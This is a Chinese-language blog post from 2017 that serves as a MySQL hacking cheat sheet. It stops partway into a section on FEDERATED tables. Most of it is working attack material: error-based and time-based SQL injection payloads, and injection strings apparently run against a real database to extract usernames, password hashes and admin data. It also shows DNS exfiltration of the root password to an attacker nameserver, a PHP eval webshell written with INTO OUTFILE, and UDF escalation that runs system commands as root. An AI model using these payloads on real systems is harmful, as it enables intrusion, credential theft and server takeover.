<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>数据库黑客 | ru0</title><meta name="description" content="数据库黑客 - ruo"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/theme.css"><link rel="search" type="application/opensearchdescription+xml" href="/atom.xml" title="ru0"></head><body><div class="wrap"><header><h1 class="branding"><a href="/" title="ru0"><img class="logo-image" src="/logo.png" alt="logo"></a></h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives" target="_self">ARCHIVES</a></li><li class="nav-list-item"><a class="nav-list-link" href="/hmind" target="_self">HACKMIND</a></li><li class="nav-list-item"><a class="nav-list-link" href="https://github.com/ru0" target="_blank">GITHUB</a></li><li class="nav-list-item"><a class="nav-list-link" href="/atom.xml" target="_self">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">数据库黑客</h1><div class="post-info"><a></a>2017-11-17</div><div class="post-content"><h2 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h2><p>MYSQL各个版本下载<br><a href="http://mirrors.sohu.com/mysql/" target="_blank" rel="external">http://mirrors.sohu.com/mysql/</a></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="常用报错函数"><a href="#常用报错函数" class="headerlink" title="常用报错函数"></a>常用报错函数</h4><p>FLOOR(X)表示向下取整</p>
<p>select FLOOR(12.2) -&gt; 12</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">UNION</span> ALL <span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x</div><div class="line"></div><div class="line">[Err] <span class="number">1062</span> - <span class="keyword">Duplicate</span> entry <span class="string">'root@localhost1'</span> <span class="keyword">for</span> <span class="keyword">key</span> <span class="string">'group_key'</span></div><div class="line"></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</div></pre></td></tr></table></figure>
<p>XML文档支持</p>
<p>ExtractValue() 长度32位限制</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</div></pre></td></tr></table></figure>
<p>[Err] 1105 - XPATH syntax error: ‘~root@localhost~’</p>
<p>UpdateXML()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</div></pre></td></tr></table></figure>
<p>[Err] 1105 - XPATH syntax error: ‘~root@localhost~‘</p>
<a id="more"></a>
<p>geometrycollection()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div></pre></td></tr></table></figure>
<p>[Err] 1367 - Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from (select user() AS <code>user()</code>) <code>a</code>) <code>b</code>)’ value found during parsing</p>
<p>multipoint()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div></pre></td></tr></table></figure>
<p>[Err] 1367 - Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from (select user() AS <code>user()</code>) <code>a</code>) <code>b</code>)’ value found during parsing</p>
<p>polygon()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">and</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div></pre></td></tr></table></figure>
<p>[Err] 1367 - Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from (select user() AS <code>user()</code>) <code>a</code>) <code>b</code>)’ value found during parsing</p>
<p>multipolygon()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">and</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div></pre></td></tr></table></figure>
<p>[Err] 1367 - Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from (select user() AS <code>user()</code>) <code>a</code>) <code>b</code>)’ value found during parsing</p>
<p>linestring()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">and</span> linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div></pre></td></tr></table></figure>
<p>[Err] 1367 - Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from (select user() AS <code>user()</code>) <code>a</code>) <code>b</code>)’ value found during parsing</p>
<p>multilinestring()</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'a'</span> </div><div class="line"><span class="keyword">and</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</div></pre></td></tr></table></figure>
<p>[Err] 1367 - Illegal non geometric ‘(select <code>b</code>.<code>user()</code> from (select ‘root@localhost’ AS <code>user()</code> from (select user() AS <code>user()</code>) <code>a</code>) <code>b</code>)’ value found during parsing</p>
<p>exp() 版本在5.5.5以上</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</div></pre></td></tr></table></figure>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>error-based<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">lang=en') AND EXTRACTVALUE(1267,CONCAT(0x5c,0x7170627871,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1267</span>=<span class="number">1267</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="number">0x7170707671</span>)) <span class="keyword">AND</span> (<span class="string">'PeJH'</span>=<span class="string">'PeJH</span></div><div class="line"><span class="string">name=b'</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, <span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">string</span> <span class="keyword">FROM</span> t <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>))) <span class="keyword">and</span> a =<span class="string">'1</span></div><div class="line"><span class="string">select * from t where name = '</span>c<span class="string">' and extractvalue(1, concat(0x7e,(SELECT string FROM t limit 1,1)) )</span></div><div class="line"><span class="string">select * from t where name = '</span>c<span class="string">' and extractvalue(1, (SELECT string FROM t limit 1,1) )</span></div><div class="line"><span class="string">lang=en'</span>) <span class="keyword">AND</span> EXTRACTVALUE(<span class="number">2872</span>,<span class="keyword">CONCAT</span>(<span class="number">0x23</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">id</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> MTN2012.<span class="string">`user`</span> <span class="keyword">LIMIT</span> <span class="number">7</span>,<span class="number">1</span>))) <span class="keyword">AND</span> (<span class="string">'XTGg'</span>=<span class="string">'XTGg</span></div><div class="line"><span class="string">en'</span>) <span class="keyword">AND</span> EXTRACTVALUE(<span class="number">2872</span>,<span class="keyword">CONCAT</span>(<span class="number">0x23</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">id</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">200</span>) <span class="keyword">FROM</span> MTN2012.<span class="string">`user`</span> <span class="keyword">where</span> username=<span class="string">'mihmd'</span> ))) <span class="keyword">and</span> (<span class="number">1</span>=<span class="string">'1;</span></div><div class="line"><span class="string">en'</span>) <span class="keyword">AND</span> EXTRACTVALUE(<span class="number">4230</span>,<span class="keyword">CONCAT</span>(<span class="number">0x5c</span>,<span class="number">0x716b787871</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(cIpAddress <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> MTN2012.admin <span class="keyword">ORDER</span> <span class="keyword">BY</span> email <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7170626271</span>)) <span class="keyword">AND</span> (<span class="string">'JonM'</span>=<span class="string">'JonM</span></div></pre></td></tr></table></figure></p>
<p>//cut string<br>SELECT MID(ColumnName, Start [, Length])<br>CAST(value as type);<br>CHAR<br>SIGNED<br>CONVERT(value, type);<br>LIMIT 18,1  //ahmad</p>
<p>left(‘ruo’,1) = ‘r’<br>substr(‘ruo’,1,1) = ‘r’<br>ascii(‘r’) = 114<br>mid(‘ruo’,1,1) = ‘r’</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">(<span class="keyword">SELECT</span> </div><div class="line"><span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) </div><div class="line"><span class="keyword">FROM</span> MTN2012.<span class="string">`user`</span> <span class="keyword">LIMIT</span> <span class="number">3</span>,<span class="number">1</span>)</div><div class="line"></div><div class="line">lang=en<span class="string">') AND </span></div><div class="line"><span class="string">EXTRACTVALUE(4230,</span></div><div class="line"><span class="string">CONCAT(0x34,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,50) FROM MTN2012.user ORDER BY id LIMIT 18,1))</span></div><div class="line"><span class="string">)</span></div><div class="line"><span class="string">AND ('</span>JonM<span class="string">'='</span>JonM;</div><div class="line"></div><div class="line">en') AND EXTRACTVALUE(4230,CONCAT(0x5c,0x716b787871,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(username <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> MTN2012.user <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7170626271</span>)) <span class="keyword">AND</span> (<span class="string">'JonM'</span>=<span class="string">'JonM;</span></div><div class="line"><span class="string">en'</span>) <span class="keyword">AND</span> EXTRACTVALUE(<span class="number">4230</span>,<span class="keyword">CONCAT</span>(<span class="number">0x34</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(username <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> MTN2012.user <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>))) <span class="keyword">AND</span> (<span class="string">'JonM'</span>=<span class="string">'JonM;</span></div><div class="line"><span class="string">en'</span>) <span class="keyword">AND</span> EXTRACTVALUE(<span class="number">1</span>,(<span class="keyword">select</span> username <span class="keyword">FROM</span> MTN2012.user <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">AND</span> (<span class="string">'JonM'</span>=<span class="string">'JonM;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">where username = 0x6261626e73696969</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">098f6bcd4621d373cade4e832627b4f6</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">select * from t where name = '</span>c<span class="string">' </span></div><div class="line"><span class="string">and extractvalue(1, </span></div><div class="line"><span class="string">(SELECT string FROM t limit 1,1)</span></div><div class="line"><span class="string">)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">select extractValue(1,(SELECT string FROM t limit 1,1))</span></div><div class="line"><span class="string">[Err] 1105 - XPATH syntax error: '</span>f6bcd4621d373cade4e832627b4f6<span class="string">'</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">select extractValue(1,(SELECT concat(":",string) FROM t limit 1,1))</span></div><div class="line"><span class="string">[Err] 1105 - XPATH syntax error: '</span>:<span class="number">098</span>f6bcd4621d373cade4e832627b4f<span class="string">'</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">floor</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">select * from t where name = '</span>c<span class="string">' </span></div><div class="line"><span class="string">-- and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  </span></div><div class="line"><span class="string">-- and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x74 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">/*</span></div><div class="line"><span class="string">and (select 1 from</span></div><div class="line"><span class="string">(</span></div><div class="line"><span class="string">select count(*),concat(</span></div><div class="line"><span class="string">(SELECT distinct concat(0x23,string) FROM t limit 2,1) -- #a:100684d61405e723#</span></div><div class="line"><span class="string">-- "hkruo"</span></div><div class="line"><span class="string">,floor(rand(0)*2))x from information_schema.tables group by x)a</span></div><div class="line"><span class="string">)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">*/</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">and (select 1 from </span></div><div class="line"><span class="string">(</span></div><div class="line"><span class="string">select count(*),concat(</span></div><div class="line"><span class="string">(SELECT distinct concat(0x23,string) FROM t limit 2,1) -- #a:100684d61405e723#</span></div><div class="line"><span class="string">,floor(rand(0)*2))x </span></div><div class="line"><span class="string">from information_schema.tables group by x</span></div><div class="line"><span class="string">)b</span></div><div class="line"><span class="string">)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">and (select 1 from </span></div><div class="line"><span class="string">(</span></div><div class="line"><span class="string">select count(*),concat(</span></div><div class="line"><span class="string">(SELECT distinct concat(0x23,password) FROM admin limit 2,1)</span></div><div class="line"><span class="string">,floor(rand(0)*2))x </span></div><div class="line"><span class="string">from information_schema.tables group by x</span></div><div class="line"><span class="string">)b</span></div><div class="line"><span class="string">)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">en'</span>)+<span class="keyword">and</span>+(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">SELECT</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(<span class="number">0x23</span>,<span class="keyword">password</span>) <span class="keyword">FROM</span> <span class="keyword">admin</span> <span class="keyword">limit</span> <span class="number">2</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)b) <span class="keyword">and</span> (<span class="string">'JonM'</span>=<span class="string">'JonM</span></div></pre></td></tr></table></figure>
<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>延时函数<br>Mysql BENCHMARK(100000,MD5(1)) or sleep(5)<br>Postgresql PG_SLEEP(5) OR GENERATE_SERIES(1,10000)<br>MSSQL  WAITFOR DELAY ‘0:0:5’</p>
<p>查询延时<br>select * from test.t where name = ‘a’</p>
<p>Payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">' or If(substr('ruo',1,1) = 'r',sleep(5),0)</div><div class="line">' and if(true,sleep(5),0) # </div><div class="line">' union <span class="keyword">select</span> <span class="keyword">benchmark</span>(<span class="number">500000</span>,<span class="keyword">md5</span>(<span class="string">'test'</span>));</div></pre></td></tr></table></figure></p>
<h3 id="DNS传输数据"><a href="#DNS传输数据" class="headerlink" title="DNS传输数据"></a>DNS传输数据</h3><p>配置域名<br>A    test    153.92.xxx.xxx<br>NS    ns1    test.domainname.com</p>
<p>语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span> <span class="keyword">LIMIT</span> <span class="number">1</span>),<span class="string">'.ns1.domainname.com\\foo'</span>));</div></pre></td></tr></table></figure></p>
<p>测试<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t <span class="keyword">WHERE</span> <span class="string">`name`</span> = <span class="string">'a'</span> </div><div class="line"><span class="keyword">or</span> <span class="keyword">if</span>((<span class="keyword">SELECT</span> <span class="keyword">LOAD_FILE</span>(<span class="keyword">CONCAT</span>(<span class="string">'\\\\'</span>,(<span class="keyword">SELECT</span> <span class="keyword">hex</span>(<span class="keyword">user</span>())),<span class="string">'.ns1.domainname.com\\foo'</span>))),<span class="number">1</span>,<span class="number">1</span>)</div></pre></td></tr></table></figure></p>
<p>使用dnschef接收数据<br><code>[22:29:07] 61.139.113.158: proxying the response of type &#39;A&#39; for 726F6F74406C6F63616C686F7374.ns1.domain.com</code></p>
<blockquote>
<p>Note</p>
<ol>
<li>考虑LOAD_FILE被禁用的情况</li>
<li>本地DNS无法解析</li>
</ol>
</blockquote>
<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><blockquote>
<p>在写文件或是shell的时候可能有些引号导致出错，这里我们可以考虑将其转换成16进制写入。如果mysql配置了 –secure-file-priv 参数将限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()函数的使用。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* 写webshell */</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="string">'&lt;?php eval($_POST[ru0]);phpinfo();?&gt;'</span>)</div><div class="line"><span class="keyword">select</span> <span class="number">0x3C3F706870206576616C28245F504F53545B7275305D293B706870696E666F28293B3F3E</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:/r1.php'</span></div><div class="line"></div><div class="line"><span class="comment">/* 还原16进制数据/etc/passwd */</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">unhex</span>(<span class="string">'2F6574632F706173737764'</span>);</div><div class="line"></div><div class="line"><span class="comment">/* 将16进制的数据保存到文本文件中 */</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">'D:/Test/setup.exe'</span>)) <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:/Test/hex16f.txt'</span>;</div><div class="line"></div><div class="line"><span class="comment">/*　导出为２进制文件　*/</span></div><div class="line"><span class="keyword">select</span> <span class="number">0x4D5A90000300000004000000</span><span class="comment">/*16进制数据*/</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'D:/Test/file.exe'</span>;</div></pre></td></tr></table></figure>
<blockquote>
<p>Note</p>
<ol>
<li>将原程序转换成16进制在写入文件的时候需要使用into dumpfile，不能使用into outfile。</li>
<li>导出时不要忘记字符串开头0x符号。</li>
</ol>
</blockquote>
<h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>Linux:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$ id</div><div class="line">uid=500(raptor) gid=500(raptor) groups=500(raptor)</div><div class="line">$ gcc -g -c raptor_udf2.c</div><div class="line">$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</div><div class="line">$ mysql -u root -p</div><div class="line">Enter password:</div><div class="line">[...]</div><div class="line">mysql&gt; use mysql;</div><div class="line">mysql&gt; create table foo(line blob);</div><div class="line">mysql&gt; insert into foo values(load_file(&apos;/home/raptor/raptor_udf2.so&apos;));</div><div class="line">mysql&gt; select * from foo into dumpfile &apos;/usr/lib/raptor_udf2.so&apos;;</div><div class="line">mysql&gt; create function do_system returns integer soname &apos;raptor_udf2.so&apos;;</div><div class="line">mysql&gt; select * from mysql.func;</div><div class="line">+-----------+-----+----------------+----------+</div><div class="line">| name      | ret | dl             | type     |</div><div class="line">+-----------+-----+----------------+----------+</div><div class="line">| do_system |   2 | raptor_udf2.so | function |</div><div class="line">+-----------+-----+----------------+----------+</div><div class="line">mysql&gt; select do_system(&apos;id &gt; /tmp/out; chown raptor.raptor /tmp/out&apos;);</div><div class="line">mysql&gt; \! sh</div><div class="line">sh-2.05b$ cat /tmp/out</div><div class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</div><div class="line">[...]</div></pre></td></tr></table></figure></p>
<p>Windows:</p>
<p>S1. 编译udf</p>
<p>udf源码<br><a href="http://www.mysqludf.org/" target="_blank" rel="external">http://www.mysqludf.org/</a><br><a href="https://github.com/sqlmapproject/udfhack" target="_blank" rel="external">https://github.com/sqlmapproject/udfhack</a></p>
<p>编译32位版本<br>MYSQL: 4.1.22<br>编译头文件: mysql-4.1.22-win32\include</p>
<p>将lib_mysqludf_sys.dll放入 c:\windows 目录内（有bug，某些命令会导致MYSQL程序崩溃。）</p>
<blockquote>
<p>Important<br>udf文件存放路径和流类型创建plugin目录（select ‘xxx’ into dumpfile ‘C:\WINDOWS\TEMP\plugin::$INDEX_ALLOCATION’;）需对照目标版本针对性测试。</p>
</blockquote>
<p>S2. 创建函数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">mysql&gt;use mysql;</div><div class="line">mysql&gt;CREATE  FUNCTION sys_exec RETURNS string SONAME <span class="string">'lib_mysqludf_sys.dll'</span>;</div><div class="line">mysql&gt;SELECT * from mysql.func;</div><div class="line">+----------+-----+-----------------------+----------+</div><div class="line">| name     | ret | dl                    | <span class="built_in">type</span>     |</div><div class="line">+----------+-----+-----------------------+----------+</div><div class="line">| sys_exec |   0 | lib_mysqludf_sys1.dll | <span class="keyword">function</span> |</div><div class="line">+----------+-----+-----------------------+----------+</div><div class="line">mysql&gt;SELECT sys_exec(<span class="string">'whoami &gt; d:/11.txt'</span>);</div><div class="line">mysql&gt;DROP FUNCTION sys_exec;</div></pre></td></tr></table></figure></p>
<h3 id="MYSQL-FEDERATED"><a href="#MYSQL-FEDERATED" class="headerlink" title="MYSQL FEDERATED"></a>MYSQL FEDERATED</h3><p>The FEDERATED storage engine lets you access data from a remote MySQL database without using replication or cluster technology.The FEDERATED storage engine is not enabled by default in the running server; to enable FEDERATED, you must start the MySQL server binary using the –federated option.</p>
<p><img src="https://i.imgur.com/gDDme2b.png" alt=""></p>
<p>Create FEDERATED Tables</p>
<p>ST1</p>
<ol>
